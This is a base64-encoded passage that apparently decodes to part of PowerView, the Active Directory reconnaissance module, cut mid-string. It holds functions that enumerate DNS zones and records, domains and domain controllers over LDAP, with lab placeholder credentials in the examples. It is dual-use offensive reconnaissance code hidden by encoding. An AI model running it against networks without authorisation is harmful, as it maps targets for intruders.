BHZXQtRG9tYWluU2VhcmNoZXIgQFNlYXJjaGVyQXJndW1lbnRzCgogICAgICAgIGlmICgkRE5TU2VhcmNoZXIyKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkRE5TU2VhcmNoZXIyLkZpbmRPbmUoKSB9CiAgICAgICAgICAgICAgICBlbHNlIHsgJFJlc3VsdHMgPSAkRE5TU2VhcmNoZXIyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICAgICAkUmVzdWx0cyB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICRPdXQgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICdab25lTmFtZScgJE91dC5uYW1lCiAgICAgICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRE5TWm9uZScpCiAgICAgICAgICAgICAgICAgICAgJE91dAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluRE5TWm9uZV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluRE5TWm9uZV0gRXJyb3IgYWNjZXNzaW5nICdDTj1NaWNyb3NvZnRETlMsREM9RG9tYWluRG5zWm9uZXMnIgogICAgICAgICAgICB9CiAgICAgICAgICAgICRETlNTZWFyY2hlcjIuZGlzcG9zZSgpCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gR2V0LURvbWFpbkROU1JlY29yZCB7CjwjCi5TWU5PUFNJUwoKRW51bWVyYXRlcyB0aGUgQWN0aXZlIERpcmVjdG9yeSBETlMgcmVjb3JkcyBmb3IgYSBnaXZlbiB6b25lLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluU2VhcmNoZXIsIENvbnZlcnQtTERBUFByb3BlcnR5LCBDb252ZXJ0LUROU1JlY29yZCAgCgouREVTQ1JJUFRJT04KCkdpdmVuIGEgc3BlY2lmaWMgQWN0aXZlIERpcmVjdG9yeSBETlMgem9uZSBuYW1lLCBxdWVyeSBmb3IgYWxsICdkbnNOb2RlJwpMREFQIGVudHJpZXMgdXNpbmcgdGhhdCB6b25lIGFzIHRoZSBzZWFyY2ggYmFzZS4gUmV0dXJuIGFsbCBETlMgZW50cnkgcmVzdWx0cwphbmQgdXNlIENvbnZlcnQtRE5TUmVjb3JkIHRvIHRyeSB0byBjb252ZXJ0IHRoZSBiaW5hcnkgRE5TIHJlY29yZCBibG9icy4KCi5QQVJBTUVURVIgWm9uZU5hbWUKClNwZWNpZmllcyB0aGUgem9uZSB0byBxdWVyeSBmb3IgcmVjb3JkcyAod2hpY2ggY2FuIGJlIGVudW1lYXJ0ZWQgd2l0aCBHZXQtRG9tYWluRE5TWm9uZSkuCgouUEFSQU1FVEVSIERvbWFpbgoKVGhlIGRvbWFpbiB0byBxdWVyeSBmb3Igem9uZXMsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvIGZvciB0aGUgc2VhcmNoLgoKLlBBUkFNRVRFUiBQcm9wZXJ0aWVzCgpTcGVjaWZpZXMgdGhlIHByb3BlcnRpZXMgb2YgdGhlIG91dHB1dCBvYmplY3QgdG8gcmV0cmlldmUgZnJvbSB0aGUgc2VydmVyLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBGaW5kT25lCgpPbmx5IHJldHVybiBvbmUgcmVzdWx0IG9iamVjdC4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluRE5TUmVjb3JkIC1ab25lTmFtZSB0ZXN0bGFiLmxvY2FsCgpSZXRyaWV2ZSBhbGwgcmVjb3JkcyBmb3IgdGhlIHRlc3RsYWIubG9jYWwgem9uZS4KCi5FWEFNUExFCgpHZXQtRG9tYWluRE5TWm9uZSB8IEdldC1Eb21haW5ETlNSZWNvcmQKClJldHJpZXZlIGFsbCByZWNvcmRzIGZvciBhbGwgem9uZXMgaW4gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5ETlNab25lIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwgfCBHZXQtRG9tYWluRE5TUmVjb3JkIC1Eb21haW4gZGV2LnRlc3RsYWIubG9jYWwKClJldHJpZXZlIGFsbCByZWNvcmRzIGZvciBhbGwgem9uZXMgaW4gdGhlIGRldi50ZXN0bGFiLmxvY2FsIGRvbWFpbi4KCi5PVVRQVVRTCgpQb3dlclZpZXcuRE5TUmVjb3JkCgpPdXRwdXRzIGN1c3RvbSBQU09iamVjdHMgd2l0aCBkZXRhaWxlZCBpbmZvcm1hdGlvbiBhYm91dCB0aGUgRE5TIHJlY29yZCBlbnRyeS4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5ETlNSZWNvcmQnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkWm9uZU5hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMgPSAnbmFtZSxkaXN0aW5ndWlzaGVkbmFtZSxkbnNyZWNvcmQsd2hlbmNyZWF0ZWQsd2hlbmNoYW5nZWQnLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkUmVzdWx0UGFnZVNpemUgPSAyMDAsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRTZXJ2ZXJUaW1lTGltaXQsCgogICAgICAgIFtBbGlhcygnUmV0dXJuT25lJyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRmluZE9uZSwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ0xEQVBGaWx0ZXInID0gJyhvYmplY3RDbGFzcz1kbnNOb2RlKScKICAgICAgICAgICAgJ1NlYXJjaEJhc2VQcmVmaXgnID0gIkRDPSQoJFpvbmVOYW1lKSxDTj1NaWNyb3NvZnRETlMsREM9RG9tYWluRG5zWm9uZXMiCiAgICAgICAgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUHJvcGVydGllcyddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snUHJvcGVydGllcyddID0gJFByb3BlcnRpZXMgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICRETlNTZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKCiAgICAgICAgaWYgKCRETlNTZWFyY2hlcikgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkRE5TU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgZWxzZSB7ICRSZXN1bHRzID0gJEROU1NlYXJjaGVyLkZpbmRBbGwoKSB9CiAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRPdXQgPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzIHwgU2VsZWN0LU9iamVjdCBuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lLGRuc3JlY29yZCx3aGVuY3JlYXRlZCx3aGVuY2hhbmdlZAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVQcm9wZXJ0eSAnWm9uZU5hbWUnICRab25lTmFtZQoKICAgICAgICAgICAgICAgICAgICAjIGNvbnZlcnQgdGhlIHJlY29yZCBhbmQgZXh0cmFjdCB0aGUgcHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgIGlmICgkT3V0LmRuc3JlY29yZCAtaXMgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5SZXN1bHRQcm9wZXJ0eVZhbHVlQ29sbGVjdGlvbl0pIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBUT0RPOiBoYW5kbGUgbXVsdGlwbGUgbmVzdGVkIHJlY29yZHMgcHJvcGVybHk/CiAgICAgICAgICAgICAgICAgICAgICAgICRSZWNvcmQgPSBDb252ZXJ0LUROU1JlY29yZCAtRE5TUmVjb3JkICRPdXQuZG5zcmVjb3JkWzBdCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkUmVjb3JkID0gQ29udmVydC1ETlNSZWNvcmQgLUROU1JlY29yZCAkT3V0LmRuc3JlY29yZAogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYgKCRSZWNvcmQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFJlY29yZC5QU09iamVjdC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5ICRfLk5hbWUgJF8uVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgJE91dC5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuRE5TUmVjb3JkJykKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1Eb21haW5ETlNSZWNvcmRdIEVycm9yOiAkXyIKICAgICAgICAgICAgICAgICAgICAkT3V0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkROU1JlY29yZF0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogJF8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJEROU1NlYXJjaGVyLmRpc3Bvc2UoKQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW4gewo8IwouU1lOT1BTSVMKClJldHVybnMgdGhlIGRvbWFpbiBvYmplY3QgZm9yIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCkF1dGhvcjogV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouREVTQ1JJUFRJT04KClJldHVybnMgYSBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbiBvYmplY3QgZm9yIHRoZSBjdXJyZW50CmRvbWFpbiBvciB0aGUgZG9tYWluIHNwZWNpZmllZCB3aXRoIC1Eb21haW4gWC4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiBuYW1lIHRvIHF1ZXJ5IGZvciwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW4gLURvbWFpbiB0ZXN0bGFiLmxvY2FsCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbiAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluCgpBIGNvbXBsZXggLk5FVCBkb21haW4gb2JqZWN0LgoKLkxJTksKCmh0dHA6Ly9zb2NpYWwudGVjaG5ldC5taWNyb3NvZnQuY29tL0ZvcnVtcy9zY3JpcHRjZW50ZXIvZW4tVVMvMGM1YjNmODMtZTUyOC00ZDQ5LTkyYTQtZGVlMzFmNGI0ODFjL2ZpbmRpbmctdGhlLWRuLW9mLXRoZS10aGUtZG9tYWluLXdpdGhvdXQtYWRtb2R1bGUtaW4tcG93ZXJzaGVsbD9mb3J1bT1JVENHCiM+CgogICAgW091dHB1dFR5cGUoW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXSldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1tHZXQtRG9tYWluXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIEdldC1Eb21haW4nCgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICREb21haW4KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICMgaWYgbm8gZG9tYWluIGlzIHN1cHBsaWVkLCBleHRyYWN0IHRoZSBsb2dvbiBkb21haW4gZnJvbSB0aGUgUFNDcmVkZW50aWFsIHBhc3NlZAogICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuRG9tYWluCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbl0gRXh0cmFjdGVkIGRvbWFpbiAnJFRhcmdldERvbWFpbicgZnJvbSAtQ3JlZGVudGlhbCIKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJERvbWFpbkNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRG9tYWluJywgJFRhcmdldERvbWFpbiwgJENyZWRlbnRpYWwuVXNlck5hbWUsICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0RG9tYWluKCREb21haW5Db250ZXh0KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluXSBUaGUgc3BlY2lmaWVkIGRvbWFpbiAnJFRhcmdldERvbWFpbicgZG9lcyBub3QgZXhpc3QsIGNvdWxkIG5vdCBiZSBjb250YWN0ZWQsIHRoZXJlIGlzbid0IGFuIGV4aXN0aW5nIHRydXN0LCBvciB0aGUgc3BlY2lmaWVkIGNyZWRlbnRpYWxzIGFyZSBpbnZhbGlkOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsKICAgICAgICAgICAgJERvbWFpbkNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRG9tYWluJywgJERvbWFpbikKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbl06OkdldERvbWFpbigkRG9tYWluQ29udGV4dCkKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbl0gVGhlIHNwZWNpZmllZCBkb21haW4gJyREb21haW4nIGRvZXMgbm90IGV4aXN0LCBjb3VsZCBub3QgYmUgY29udGFjdGVkLCBvciB0aGVyZSBpc24ndCBhbiBleGlzdGluZyB0cnVzdCA6ICRfIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6R2V0Q3VycmVudERvbWFpbigpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5dIEVycm9yIHJldHJpZXZpbmcgdGhlIGN1cnJlbnQgZG9tYWluOiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1Eb21haW5Db250cm9sbGVyIHsKPCMKLlNZTk9QU0lTCgpSZXR1cm4gdGhlIGRvbWFpbiBjb250cm9sbGVycyBmb3IgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluQ29tcHV0ZXIsIEdldC1Eb21haW4gIAoKLkRFU0NSSVBUSU9OCgpFbnVtZXJhdGVzIHRoZSBkb21haW4gY29udHJvbGxlcnMgZm9yIHRoZSBjdXJyZW50IG9yIHNwZWNpZmllZCBkb21haW4uCkJ5IGRlZmF1bHQgYnVpbHQgaW4gLk5FVCBtZXRob2RzIGFyZSB1c2VkLiBUaGUgLUxEQVAgc3dpdGNoIHVzZXMgR2V0LURvbWFpbkNvbXB1dGVyCnRvIHNlYXJjaCBmb3IgZG9tYWluIGNvbnRyb2xsZXJzLgoKLlBBUkFNRVRFUiBEb21haW4KClRoZSBkb21haW4gdG8gcXVlcnkgZm9yIGRvbWFpbiBjb250cm9sbGVycywgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIExEQVAKClN3aXRjaC4gVXNlIExEQVAgcXVlcmllcyB0byBkZXRlcm1pbmUgdGhlIGRvbWFpbiBjb250cm9sbGVycyBpbnN0ZWFkIG9mIGJ1aWx0IGluIC5ORVQgbWV0aG9kcy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29udHJvbGxlciAtRG9tYWluICd0ZXN0LmxvY2FsJwoKRGV0ZXJtaW5lIHRoZSBkb21haW4gY29udHJvbGxlcnMgZm9yICd0ZXN0LmxvY2FsJy4KCi5FWEFNUExFCgpHZXQtRG9tYWluQ29udHJvbGxlciAtRG9tYWluICd0ZXN0LmxvY2FsJyAtTERBUAoKRGV0ZXJtaW5lIHRoZSBkb21haW4gY29udHJvbGxlcnMgZm9yICd0ZXN0LmxvY2FsJyB1c2luZyBMREFQIHF1ZXJpZXMuCgouRVhBTVBMRQoKJ3Rlc3QubG9jYWwnIHwgR2V0LURvbWFpbkNvbnRyb2xsZXIKCkRldGVybWluZSB0aGUgZG9tYWluIGNvbnRyb2xsZXJzIGZvciAndGVzdC5sb2NhbCcuCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbkNvbnRyb2xsZXIgLUNyZWRlbnRpYWwgJENyZWQKCi5PVVRQVVRTCgpQb3dlclZpZXcuQ29tcHV0ZXIKCk91dHB1dHMgY3VzdG9tIFBTT2JqZWN0cyB3aXRoIGRldGFpbHMgYWJvdXQgdGhlIGVudW1lcmF0ZWQgZG9tYWluIGNvbnRyb2xsZXIgaWYgLUxEQVAgaXMgc3BlY2lmaWVkLgoKU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5Db250cm9sbGVyCgpJZiAtTERBUCBpc24ndCBzcGVjaWZpZWQuCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuQ29tcHV0ZXInKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5LkRvbWFpbkNvbnRyb2xsZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkTERBUCwKCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCgogICAgUFJPQ0VTUyB7CiAgICAgICAgJEFyZ3VtZW50cyA9IEB7fQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRBcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgaWYgKCRQ